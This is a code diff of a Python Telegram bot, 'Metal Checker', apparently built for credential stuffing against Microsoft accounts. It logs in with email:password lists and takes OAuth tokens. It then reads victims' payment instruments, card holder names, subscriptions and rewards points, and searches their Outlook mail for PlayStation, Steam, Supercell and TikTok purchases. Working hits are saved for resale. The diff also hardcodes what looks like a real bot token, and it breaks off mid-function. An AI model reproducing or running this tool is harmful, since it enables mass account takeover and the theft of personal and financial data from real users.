@@ -1,54 +1,42 @@
-# -*- coding: utf-8 -*-
-"""
-Metal Checker — Automated Account Verification Infrastructure
-Developer: @vantrexXxx
-Powered by: Metal Drops
-"""
+# Metal Checker v1.0 - Telegram Bot Edition
+# Coded by Chester Lua
+# Supported by: Metal Drops & Icardi
 
-import os
-import sys
-import time
+import telebot
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+import requests
+import json
 import uuid
 import re
-import json
-import logging
-import threading
+import time
+import os
+import sys
 import shutil
-import concurrent.futures
 from datetime import datetime
 from pathlib import Path
+from threading import Lock, Thread, Event
+from concurrent.futures import ThreadPoolExecutor
 from urllib.parse import quote, unquote
-import requests
-import telebot
-from telebot import types
 
-# Setup Logging
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+# -----------------------------------------
+# GLOBAL SETTINGS & TOKENS
+# -----------------------------------------
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "8812460550:AAFlrjKwwAdoGFb-DWtwt9CGF7eeQmJnKmM")
+bot = telebot.TeleBot(BOT_TOKEN)
 
-# ══════════════════════════════════════════════════════════════════════
-#  ENVIRONMENT CONFIGURATION & INITIALIZATION
-# ══════════════════════════════════════════════════════════════════════
-BOT_TOKEN = os.getenv("BOT_TOKEN", "")
+# User state management
+user_states = {}
+user_configs = {}
+active_tasks = {}
+stop_flags = {}
 
-if not BOT_TOKEN:
-    print("[-] Error: BOT_TOKEN environment variable must be set!")
-    sys.exit(1)
-
-bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")
-
-# Thread safe state control
-active_scans = {}
-state_lock = threading.Lock()
-file_lock = threading.Lock()
-
-# ══════════════════════════════════════════════════════════════════════
-#  CORE UNIFIED CHECKER ENGINE
-# ══════════════════════════════════════════════════════════════════════
+# -----------------------------------------
+# CORE CHECKER CLASS
+# -----------------------------------------
 class UnifiedChecker:
-    def __init__(self, keywords=None, debug=False, api_mode=1, check_mode="both"):
+    def __init__(self, keywords=None, api_mode=2, check_mode="both"):
         self.session = requests.Session()
         self.uuid = str(uuid.uuid4())
-        self.debug = debug
         self.keywords = keywords if keywords else []
         self.api_mode = api_mode
         self.check_mode = check_mode
@@ -65,10 +53,15 @@ class UnifiedChecker:
                     if isinstance(location, str):
                         parts = [p.strip() for p in location.split(',')]
                         return parts[-1] if parts else ""
+                    elif isinstance(location, dict):
+                        for key in ['country', 'countryOrRegion', 'countryCode']:
+                            if key in location and location[key]:
+                                return str(location[key])
                 for key in ['country', 'countryOrRegion', 'countryCode', 'Country']:
                     if key in json_data and json_data[key]:
                         return str(json_data[key])
-        except: pass
+        except:
+            pass
         return ""
     
     def parse_name_from_json(self, json_data):
@@ -79,43 +72,57 @@ class UnifiedChecker:
                 for key in ['name', 'givenName', 'fullName']:
                     if key in json_data and json_data[key]:
                         return str(json_data[key])
-        except: pass
+        except:
+            pass
         return ""
     
     def extract_inbox_count(self, text):
         try:
-            patterns = [r'"DisplayName":"Inbox","TotalCount":(\d+)', r'"TotalCount":(\d+)', r'Inbox","TotalCount":(\d+)']
+            patterns = [
+                r'"DisplayName":"Inbox","TotalCount":(\d+)',
+                r'"TotalCount":(\d+)',
+                r'Inbox","TotalCount":(\d+)'
+            ]
             for pattern in patterns:
                 match = re.search(pattern, text)
-                if match: return match.group(1)
-        except: pass
+                if match:
+                    return match.group(1)
+        except:
+            pass
         return "0"
     
     def get_remaining_days(self, date_str):
         try:
-            if not date_str: return "0"
+            if not date_str:
+                return "?"
             renewal_date = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
             today = datetime.now(renewal_date.tzinfo)
-            return str((renewal_date - today).days)
-        except: return "0"
+            remaining = (renewal_date - today).days
+            return str(remaining)
+        except:
+            return "?"
     
     def check_microsoft_subscriptions(self, email, password, access_token, cid):
         try:
             user_id = str(uuid.uuid4()).replace('-', '')[:16]
             state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})
-            payment_auth_url = f"https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state={quote(state_json)}&prompt=none"
+            payment_auth_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=" + quote(state_json) + "&prompt=none"
             
             headers = {
                 "Host": "login.live.com",
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "en-US,en;q=0.5",
+                "Connection": "keep-alive",
                 "Referer": "https://account.microsoft.com/"
             }
-            r = self.session.get(payment_auth_url, headers=headers, allow_redirects=False, timeout=6)
+            
+            r = self.session.get(payment_auth_url, headers=headers, allow_redirects=True, timeout=20)
             payment_token = None
             search_text = r.text + " " + r.url
             
-            for pattern in [r'access_token=([^&\s"\']+)', r'"access_token":"([^"]+)"']:
+            token_patterns = [r'access_token=([^&\s"\']+)', r'"access_token":"([^"]+)"']
+            for pattern in token_patterns:
                 match = re.search(pattern, search_text)
                 if match:
                     payment_token = unquote(match.group(1))
@@ -129,7 +136,7 @@ class UnifiedChecker:
             payment_headers = {
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                 "Accept": "application/json",
-                "Authorization": f'MSADELEGATE1.0="{payment_token}"',
+                "Authorization": 'MSADELEGATE1.0="' + payment_token + '"',
                 "Content-Type": "application/json",
                 "Host": "paymentinstruments.mp.microsoft.com",
                 "ms-cV": str(uuid.uuid4()),
@@ -139,526 +146,518 @@ class UnifiedChecker:
             
             try:
                 payment_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
-                r_pay = self.session.get(payment_url, headers=payment_headers, timeout=5)
+                r_pay = self.session.get(payment_url, headers=payment_headers, timeout=15)
                 if r_pay.status_code == 200:
                     balance_match = re.search(r'"balance"\s*:\s*([0-9.]+)', r_pay.text)
                     if balance_match: sub_data['balance'] = "$" + balance_match.group(1)
+                    card_match = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', r_pay.text, re.DOTALL)
+                    if card_match: sub_data['card_holder'] = card_match.group(1)
+            except: pass
+            
+            try:
+                rewards_r = self.session.get("https://rewards.bing.com/", timeout=10)
+                points_match = re.search(r'"availablePoints"\s*:\s*(\d+)', rewards_r.text)
+                if points_match: sub_data['rewards_points'] = points_match.group(1)
             except: pass
             
             try:
                 trans_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
-                r_sub = self.session.get(trans_url, headers=payment_headers, timeout=5)
+                r_sub = self.session.get(trans_url, headers=payment_headers, timeout=15)
+                
                 if r_sub.status_code == 200:
                     response_text = r_sub.text
                     subscription_keywords = {
                         'Xbox Game Pass Ultimate': {'type': 'GAME PASS ULTIMATE', 'category': 'gaming'},
                         'PC Game Pass': {'type': 'PC GAME PASS', 'category': 'gaming'},
                         'Xbox Game Pass': {'type': 'GAME PASS', 'category': 'gaming'},
+                        'EA Play': {'type': 'EA PLAY', 'category': 'gaming'},
                         'Xbox Live Gold': {'type': 'XBOX LIVE GOLD', 'category': 'gaming'},
                         'Microsoft 365 Family': {'type': 'M365 FAMILY', 'category': 'office'},
-                        'Microsoft 365 Personal': {'type': 'M365 PERSONAL', 'category': 'office'}
+                        'Microsoft 365 Personal': {'type': 'M365 PERSONAL', 'category': 'office'},
+                        'Office 365': {'type': 'OFFICE 365', 'category': 'office'},
+                        'OneDrive': {'type': 'ONEDRIVE', 'category': 'storage'},
                     }
+                    
                     for keyword, info in subscription_keywords.items():
                         if keyword in response_text:
                             sub_info = {'name': info['type'], 'category': info['category']}
+                            title_match = re.search(r'"title"\s*:\s*"([^"]+)"', response_text)
+                            if title_match: sub_info['title'] = title_match.group(1)
+                            
                             renewal_match = re.search(r'"nextRenewalDate"\s*:\s*"([^T"]+)', response_text)
                             if renewal_match:
-                                sub_info['renewal_date'] = renewal_match.group(1)
-                                days_remaining = self.get_remaining_days(date_str=renewal_match.group(1) + "T00:00:00Z")
+                                renewal_date = renewal_match.group(1)
+                                sub_info['renewal_date'] = renewal_date
+                                days_remaining = self.get_remaining_days(renewal_date + "T00:00:00Z")
                                 sub_info['days_remaining'] = days_remaining
-                                if int(days_remaining) < 0: sub_info['is_expired'] = True
+                                try:
+                                    if days_remaining == "?" or int(days_remaining) <= 0:
+                                        sub_info['is_expired'] = True
+                                except: pass
+                            
                             subscriptions.append(sub_info)
+                            
+                    if subscriptions:
+                        return {"status": "PREMIUM", "subscriptions": subscriptions, "data": sub_data}
             except: pass
-            
-            active_subs = [s for s in subscriptions if not s.get('is_expired', False)]
-            return {"status": "PREMIUM" if active_subs else "FREE", "subscriptions": subscriptions, "data": sub_data}
-        except:
-            return {"status": "FREE", "subscriptions": [], "data": {}}
-
+            return {"status": "FREE", "subscriptions": [], "data": sub_data}
+        except Exception:
+            return {"status": "ERROR", "subscriptions": [], "data": {}}
+    
     def check_psn(self, email, access_token, cid):
         try:
             search_url = "https://outlook.live.com/search/api/v2/query"
             payload = {
                 "Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "UTC", "TextDecorations": "Off",
-                "EntityRequests": [{
-                    "EntityType": "Conversation", "ContentSources": ["Exchange"],
-                    "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
-                    "From": 0, "Query": {"QueryString": "sony@txn-email.playstation.com OR PlayStation Order Number"}, "Size": 15
-                }]
+                "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]}, "From": 0, "Query": {"QueryString": "sony@txn-email.playstation.com OR sony@email02.account.sony.com OR PlayStation Order Number"}, "Size": 50, "Sort": [{"Field": "Time", "SortDirection": "Desc"}]}]
             }
             headers = {'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json', 'Authorization': f'Bearer {access_token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json'}
-            r = self.session.post(search_url, json=payload, headers=headers, timeout=5)
+            r = self.session.post(search_url, json=payload, headers=headers, timeout=15)
             if r.status_code == 200:
                 data = r.json()
-                total_orders = data.get('EntitySets', [{}])[0].get('ResultSets', [{}])[0].get('Total', 0)
-                if total_orders > 0: return {"psn_status": "HAS_ORDERS", "psn_orders": total_orders}
-            return {"psn_status": "FREE", "psn_orders": 0}
-        except: return {"psn_status": "FREE", "psn_orders": 0}
+                purchases = []
+                total_orders = 0
+                if 'EntitySets' in data and len(data['EntitySets']) > 0:
+                    entity_set = data['EntitySets'][0]
+                    if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
+                        result_set = entity_set['ResultSets'][0]
+                        total_orders = result_set.get('Total', 0)
+                        if 'Results' in result_set:
+                            for result in result_set['Results'][:15]:
+                                purchase_info = {}
+                                if 'Preview' in result:
+                                    full_text = result.get('ItemBody', {}).get('Content', result['Preview'])
+                                    game_patterns = [r'Thank you for purchasing\s+([^\.]+?)(?:\s+from|\.|$)', r'You\'ve bought\s+([^\.]+?)(?:\s+from|\.|$)', r'Order.*?:\s*([A-Z][^\n\.]{5,60}?)(?:\s+has|\s+is|\s+for|\.|$)']
+                                    for pattern in game_patterns:
+                                        match = re.search(pattern, full_text, re.IGNORECASE)
+                                        if match:
+                                            purchase_info['item'] = match.group(1).strip()
+                                            break
+                                if purchase_info.get('item'): purchases.append(purchase_info)
+                if total_orders > 0: return {"psn_status": "HAS_ORDERS", "psn_orders": total_orders, "purchases": purchases}
+            return {"psn_status": "FREE", "psn_orders": 0, "purchases": []}
+        except: return {"psn_status": "ERROR", "psn_orders": 0, "purchases": []}
 
     def check_steam(self, email, access_token, cid):
         try:
             search_url = "https://outlook.live.com/search/api/v2/query"
             payload = {
-                "Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"},
-                "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Query": {"QueryString": "noreply@steampowered.com purchase"}, "Size": 10}]
+                "Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "UTC", "TextDecorations": "Off",
+                "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]}, "From": 0, "Query": {"QueryString": "noreply@steampowered.com purchase"}, "Size": 30, "Sort": [{"Field": "Time", "SortDirection": "Desc"}]}]
             }
-            headers = {'Authorization': f'Bearer {access_token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json'}
-            r = self.session.post(search_url, json=payload, headers=headers, timeout=5)
+            headers = {'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json', 'Authorization': f'Bearer {access_token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json'}
+            r = self.session.post(search_url, json=payload, headers=headers, timeout=10)
             if r.status_code == 200:
-                total = r.json().get('EntitySets', [{}])[0].get('ResultSets', [{}])[0].get('Total', 0)
-                if total > 0: return {"steam_status": "HAS_PURCHASES", "steam_count": total}
-            return {"steam_status": "FREE", "steam_count": 0}
-        except: return {"steam_status": "FREE", "steam_count": 0}
+                data = r.json()
+                purchases = []
+                total = 0
+                if 'EntitySets' in data and len(data['EntitySets']) > 0:
+                    entity_set = data['EntitySets'][0]
+                    if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
+                        total = entity_set['ResultSets'][0].get('Total', 0)
+                if total > 0: return {"steam_status": "HAS_PURCHASES", "steam_count": total, "purchases": purchases}
+            return {"steam_status": "FREE", "steam_count": 0, "purchases": []}
+        except: return {"steam_status": "ERROR", "steam_count": 0, "purchases": []}
 
     def check_supercell(self, email, access_token, cid):
         try:
             search_url = "https://outlook.live.com/search/api/v2/query"
             payload = {
-                "Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"},
-                "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Query": {"QueryString": "noreply@id.supercell.com"}, "Size": 10}]
+                "Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "UTC", "TextDecorations": "Off",
+                "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]}, "From": 0, "Query": {"QueryString": "noreply@id.supercell.com"}, "Size": 20, "Sort": [{"Field": "Time", "SortDirection": "Desc"}]}]
             }
-            headers = {'Authorization': f'Bearer {access_token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json'}
-            r = self.session.post(search_url, json=payload, headers=headers, timeout=5)
+            headers = {'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json', 'Authorization': f'Bearer {access_token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json'}
+            r = self.session.post(search_url, json=payload, headers=headers, timeout=10)
             if r.status_code == 200:
-                total = r.json().get('EntitySets', [{}])[0].get('ResultSets', [{}])[0].get('Total', 0)
-                if total > 0: return {"supercell_status": "LINKED"}
-            return {"supercell_status": "FREE"}
-        except: return {"supercell_status": "FREE"}
+                data = r.json()
+                games = []
+                if 'EntitySets' in data and len(data['EntitySets']) > 0:
+                    result_set = data['EntitySets'][0].get('ResultSets', [{}])[0]
+                    if result_set.get('Total', 0) > 0 and 'Results' in result_set:
+                        for result in result_set['Results']:
+                            if 'Preview' in result:
+                                preview = result['Preview']
+                                if 'Clash Royale' in preview and 'Clash Royale' not in games: games.append('Clash Royale')
+                                if 'Clash of Clans' in preview and 'Clash of Clans' not in games: games.append('Clash of Clans')
+                                if 'Brawl Stars' in preview and 'Brawl Stars' not in games: games.append('Brawl Stars')
+                        if games: return {"supercell_status": "LINKED", "games": games}
+            return {"supercell_status": "FREE", "games": []}
+        except: return {"supercell_status": "ERROR", "games": []}
 
     def check_tiktok(self, email, access_token, cid):
         try:
             search_url = "https://outlook.live.com/search/api/v2/query"
             payload = {
-                "Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"},
-                "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Query": {"QueryString": "account.tiktok"}, "Size": 5}]
+                "Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "UTC", "TextDecorations": "Off",
+                "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]}, "From": 0, "Query": {"QueryString": "account.tiktok"}, "Size": 10, "Sort": [{"Field": "Time", "SortDirection": "Desc"}]}]
             }
-            headers = {'Authorization': f'Bearer {access_token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json'}
-            r = self.session.post(search_url, json=payload, headers=headers, timeout=5)
+            headers = {'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json', 'Authorization': f'Bearer {access_token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json'}
+            r = self.session.post(search_url, json=payload, headers=headers, timeout=10)
             if r.status_code == 200:
-                total = r.json().get('EntitySets', [{}])[0].get('ResultSets', [{}])[0].get('Total', 0)
-                if total > 0: return {"tiktok_status": "LINKED"}
-            return {"tiktok_status": "FREE"}
-        except: return {"tiktok_status": "FREE"}
+                data = r.json()
+                if 'EntitySets' in data and len(data['EntitySets']) > 0:
+                    result_set = data['EntitySets'][0].get('ResultSets', [{}])[0]
+                    if result_set.get('Total', 0) > 0: return {"tiktok_status": "LINKED", "username": "Found"}
+            return {"tiktok_status": "FREE", "username": None}
+        except: return {"tiktok_status": "ERROR", "username": None}
 
     def check_minecraft(self, email, access_token, cid):
         try:
-            r = self.session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {access_token}'}, timeout=5)
+            headers = {'Authorization': f'Bearer {access_token}', 'User-Agent': 'Outlook-Android/2.0'}
+            r = self.session.get('https://api.minecraftservices.com/minecraft/profile', headers=headers, timeout=10)
             if r.status_code == 200:
-                return {"minecraft_status": "OWNED", "minecraft_username": r.json().get('name', 'Unknown')}
-            return {"minecraft_status": "FREE"}
-        except: return {"minecraft_status": "FREE"}
-
-    def check_inbox_folders(self, email, access_token, cid):
-        try:
-            url = "https://outlook.live.com/search/api/v2/query"
-            payload = {
-                "Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"},
-                "EntityRequests": [{"EntityType": "Folder", "ContentSources": ["Exchange"], "Size": 20}]
-            }
-            headers = {'Authorization': f'Bearer {access_token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json'}
-            r = self.session.post(url, json=payload, headers=headers, timeout=5)
-            if r.status_code == 200:
-                return self.extract_inbox_count(r.text)
-            return "0"
-        except: return "0"
+                data = r.json()
+                return {"minecraft_status": "OWNED", "minecraft_username": data.get('name', 'Unknown')}
+            return {"minecraft_status": "FREE", "minecraft_username": None}
+        except: return {"minecraft_status": "ERROR", "minecraft_username": None}
 
     def check(self, email, password):
         try:
             url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
-            headers1 = {
-                "X-OneAuth-AppName": "Outlook Lite", "X-CorrelationId": self.uuid,
-                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N)"
-            }
-            r1 = self.session.get(url1, headers=headers1, timeout=6)
-            if "MSAccount" not in r1.text or any(k in r1.text for k in ["Neither", "Both", "OrgId"]):
+            headers1 = {"X-OneAuth-AppName": "Outlook Lite", "X-Office-Version": "3.11.0-minApi24", "X-CorrelationId": self.uuid, "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)", "Host": "odc.officeapps.live.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip"}
+            r1 = self.session.get(url1, headers=headers1, timeout=15)
+            
+            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text or "MSAccount" not in r1.text:
                 return {"status": "BAD"}
             
+            time.sleep(0.3)
             url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
-            r2 = self.session.get(url2, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}, timeout=6)
+            headers2 = {"User-Agent": "Mozilla/5.0", "Accept": "*/*", "Connection": "keep-alive"}
+            r2 = self.session.get(url2, headers=headers2, allow_redirects=True, timeout=15)
             
             url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
             ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
             if not url_match or not ppft_match: return {"status": "BAD"}
             
             post_url = url_match.group(1).replace("\\/", "/")
-            login_data = f"login={email}&loginfmt={email}&passwd={password}&PPFT={ppft_match.group(1)}&type=11&LoginOptions=1"
-            r3 = self.session.post(post_url, data=login_data, headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}, allow_redirects=False, timeout=6)
+            ppft = ppft_match.group(1)
+            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&PPFT={ppft}&PPSX=PassportR&NewUser=1"
+            headers3 = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0", "Origin": "https://login.live.com", "Referer": r2.url}
             
-            if "incorrect" in r3.text.lower() or "error" in r3.text.lower(): return {"status": "BAD"}
-            if "identity/confirm" in r3.text.lower() or "consent" in r3.text.lower(): return {"status": "2FA"}
+            r3 = self.session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)
+            response_text = r3.text.lower()
+            
+            if "account or password is incorrect" in response_text or r3.text.count("error") > 0: return {"status": "BAD"}
+            if "identity/confirm" in response_text or "consent" in response_text: return {"status": "2FA", "email": email, "password": password}
+            if "abuse" in response_text: return {"status": "BAD"}
             
             location = r3.headers.get("Location", "")
             code_match = re.search(r'code=([^&]+)', location)
             if not code_match: return {"status": "BAD"}
             
-            mspcid = self.session.cookies.get("MSPCID", "").upper()
-            token_data = f"client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&grant_type=authorization_code&code={code_match.group(1)}&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
-            r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=6)
-            if "access_token" not in r4.text: return {"status": "BAD"}
+            code = code_match.group(1)
+            mspcid = self.session.cookies.get("MSPCID", "")
+            if not mspcid: return {"status": "BAD"}
+            cid = mspcid.upper()
             
+            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
+            r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=15)
+            
+            if "access_token" not in r4.text: return {"status": "BAD"}
             access_token = r4.json()["access_token"]
             
-            inbox_count = "0"
-            if self.check_mode == "inbox":
-                inbox_count = self.check_inbox_folders(email, access_token, mspcid)
-                ms_res = {"status": "FREE", "subscriptions": []}
-                psn_res = {"psn_status": "FREE", "psn_orders": 0}
-                steam_res = {"steam_status": "FREE", "steam_count": 0}
-                sc_res = {"supercell_status": "FREE"}
-                tt_res = {"tiktok_status": "FREE"}
-                mc_res = {"minecraft_status": "FREE"}
-            else:
-                ms_res = self.check_microsoft_subscriptions(email, password, access_token, mspcid)
-                psn_res = self.check_psn(email, access_token, mspcid)
-                steam_res = self.check_steam(email, access_token, mspcid)
-                sc_res = self.check_supercell(email, access_token, mspcid)
-                tt_res = self.check_tiktok(email, access_token, mspcid)
-                mc_res = self.check_minecraft(email, access_token, mspcid)
+            ms_result, psn_result, steam_result, supercell_result, tiktok_result, minecraft_result = {}, {}, {}, {}, {}, {}
             
-            return {
-                "status": "HIT", "email": email, "password": password, "inbox_count": inbox_count,
-                "ms_status": ms_res.get("status", "FREE"), "subscriptions": ms_res.get("subscriptions", []),
-                "psn_status": psn_res.get("psn_status", "FREE"), "psn_orders": psn_res.get("psn_orders", 0),
-                "steam_status": steam_res.get("steam_status", "FREE"), "steam_count": steam_res.get("steam_count", 0),
-                "supercell_status": sc_res.get("supercell_status", "FREE"),
-                "tiktok_status": tt_res.get("tiktok_status", "FREE"),
-                "minecraft_status": mc_res.get("minecraft_status", "FREE")
-            }
-        except: return {"status": "BAD"}
+            if self.check_mode in ["microsoft", "both"]: ms_result = self.check_microsoft_subscriptions(email, password, access_token, cid)
+            if self.check_mode in ["psn", "both"]: psn_result = self.check_psn(email, access_token, cid)
+            if self.check_mode in ["steam", "both"]: steam_result = self.check_steam(email, access_token, cid)
+            if self.check_mode in ["supercell", "both"]: supercell_result = self.check_supercell(email, access_token, cid)
+            if self.check_mode in ["tiktok", "both"]: tiktok_result = self.check_tiktok(email, access_token, cid)
+            if self.check_mode in ["minecraft", "both"]: minecraft_result = self.check_minecraft(email, access_token, cid)
+            
+            result = {"status": "HIT", "email": email, "password": password}
+            if ms_result:
+                result["ms_status"] = ms_result.get("status", "FREE")
+                result["subscriptions"] = ms_result.get("subscriptions", [])
+            if psn_result: result["psn_orders"] = psn_result.get("psn_orders", 0)
+            if steam_result: result["steam_count"] = steam_result.get("steam_count", 0)
+            if supercell_result: result["supercell_games"] = supercell_result.get("games", [])
+            if tiktok_result: result["tiktok_username"] = tiktok_result.get("username")
+            if minecraft_result: result["minecraft_username"] = minecraft_result.get("minecraft_username")
+            
+            return result
+        except requests.exceptions.Timeout: return {"status": "TIMEOUT"}
+        except Exception: return {"status": "ERROR"}
 
-# ══════════════════════════════════════════════════════════════════════
-#  TELEGRAM DYNAMIC FOLDER RESULT MANAGER
-# ══════════════════════════════════════════════════════════════════════
-class DynamicResultManager:
-    def __init__(self, task_id, check_mode="both"):
-        self.check_mode = check_mode
-        self.base_folder = f"results/task_{task_id}_{datetime.now().strftime('%H%M%S')}"
-        
-        if self.check_mode == "inbox":
-            self.inbox_hits = os.path.join(self.base_folder, "inbox_hits")
-            Path(self.inbox_hits).mkdir(parents=True, exist_ok=True)
-        else:
-            self.xbox_folder = os.path.join(self.base_folder, "xbox_hits")
-            self.psn_folder = os.path.join(self.base_folder, "psn_hits")
-            self.steam_folder = os.path.join(self.base_folder, "steam_hits")
-            self.other_hits = os.path.join(self.base_folder, "other_hits")
-            
-            Path(self.xbox_folder).mkdir(parents=True, exist_ok=True)
-            Path(self.psn_folder).mkdir(parents=True, exist_ok=True)
-            Path(self.steam_folder).mkdir(parents=True, exist_ok=True)
-            Path(self.other_hits).mkdir(parents=True, exist_ok=True)
-        
-        self.all_hits_file = os.path.join(self.base_folder, "all_hits.txt")
+
+# -----------------------------------------
+# RESULT MANAGER & LIVE STATS
+# -----------------------------------------
+class ResultManager:
+    def __init__(self, chat_id, mode_name):
+        self.chat_id = chat_id
+        timestamp = datetime.now().strftime("%Y-%m-%d")
+        self.base_folder = f"results_{chat_id}_{timestamp}"
+        self.hits_file = os.path.join(self.base_folder, "hits.txt")
+        self.active_subs = os.path.join(self.base_folder, "active_subs.txt")
+        self.expired_subs = os.path.join(self.base_folder, "expired_subs.txt")
         self.two_fa_file = os.path.join(self.base_folder, "2fa.txt")
-
-    def save_result(self, res):
-        with file_lock:
-            if self.check_mode == "inbox":
-                line = f"{res['email']}:{res['password']} | Inbox Mails: {res['inbox_count']}\n"
-                with open(self.all_hits_file, "a", encoding="utf-8") as f: f.write(line)
-                with open(os.path.join(self.inbox_hits, "inbox_actives.txt"), "a", encoding="utf-8") as f: f.write(line)
+        
+        Path(self.base_folder).mkdir(parents=True, exist_ok=True)
+        
+    def save_hit(self, result_data):
+        email, password = result_data['email'], result_data['password']
+        with open(self.hits_file, 'a', encoding='utf-8') as f:
+            f.write(f"{email}:{password}\n")
+            
+        subs = result_data.get("subscriptions", [])
+        if subs:
+            # Check if there's any sub that is NOT expired AND doesn't have '?' days
+            has_active = any(not s.get('is_expired', False) and s.get('days_remaining', '?') != '?' for s in subs)
+            
+            line = f"{email}:{password} | "
+            for s in subs:
+                line += f"[{s.get('name', 'SUB')} - Days: {s.get('days_remaining', '?')}] "
+            line += "\n"
+            
+            if has_active:
+                with open(self.active_subs, 'a', encoding='utf-8') as f:
+                    f.write(line)
             else:
-                line = f"{res['email']}:{res['password']}\n"
-                with open(self.all_hits_file, "a", encoding="utf-8") as f: f.write(line)
-                
-                if res.get("ms_status") == "PREMIUM" or len(res.get("subscriptions", [])) > 0:
